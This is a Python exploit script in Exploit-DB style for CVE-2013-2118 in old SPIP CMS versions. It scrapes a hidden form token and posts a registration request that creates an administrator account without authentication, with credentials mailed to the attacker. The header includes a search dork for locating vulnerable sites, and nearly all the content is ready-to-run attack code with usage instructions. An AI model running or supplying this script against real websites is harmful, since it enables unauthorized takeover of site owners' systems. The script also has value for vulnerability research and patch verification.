#!/usr/bin/env python
# Exploit Title: SPIP - CMS < 3.0.9 / 2.1.22 / 2.0.23 - Privilege escalation to administrator account from non authenticated user
# Date: 04/30/2014
# Flaw finder : Unknown
# Exploit Author: Gregory DRAPERI
# Email: gregory |dot| draperi |at| gmail |dot| com
# Google Dork : inurl="spip.php"
# Vendor Homepage: www.spip.net
# Software Link: http://files.spip.org/spip/archives/
# Version: SPIP < 3.0.9 / 2.1.22 / 2.0.23
# Tested on: Windows 7 - SPIP 2.2.21
# CVE : CVE-2013-2118
'''
---------------------------------------------------------------------------------------------------------
Software Description:
SPIP is a free software content management system
---------------------------------------------------------------------------------------------------------
Vulnerability Details:
This vulnerability allows remote attackers to create an administrator account on the CMS without being authenticated.
To exploit the flaw, a SMTP configuration has to be configured on SPIP because the password is sent by mail.

'''
import urllib, urllib2
import cookielib
import sys
import re

def send_request(urlOpener, url, post_data=None):
   request = urllib2.Request(url)
   url = urlOpener.open(request, post_data)
   return url.read()

if len(sys.argv) < 4:
   print "SPIP < 3.0.9 / 2.1.22 / 2.0.23 exploit by Gregory DRAPERI\n\tUsage: python script.py <SPIP base_url> <login> <mail>"
   exit()

base_url = sys.argv[1]
login = sys.argv[2]
mail = sys.argv[3]

cookiejar = cookielib.CookieJar()
urlOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))


formulaire = send_request(urlOpener, base_url+"/spip.php?page=identifiants&mode=0minirezo")
print "[+] First request sended..."


m = re.search("<input name='formulaire_action_args' type='hidden'\n[^>]*", formulaire)
m = re.search("(?<=value=')[\w\+/=]*",m.group(0));


formulaire_data = {'var_ajax' : 'form',
                   'page' : 'identifiants',
                   'mode' : '0minirezo',
				   'formulaire_action' : 'inscription',
				   'formulaire_action_args' : m.group(0),
				   'nom_inscription' : login,
				   'mail_inscription' : mail,
				   'nobot' : ''
                  }
formulaire_data = urllib.urlencode(formulaire_data)


send_request(urlOpener, base_url+"/spip.php?page=identifiants&mode=0minirezo", formulaire_data)
print "[+] Second request sended"


print "[+] You should receive an email with credentials soon :) "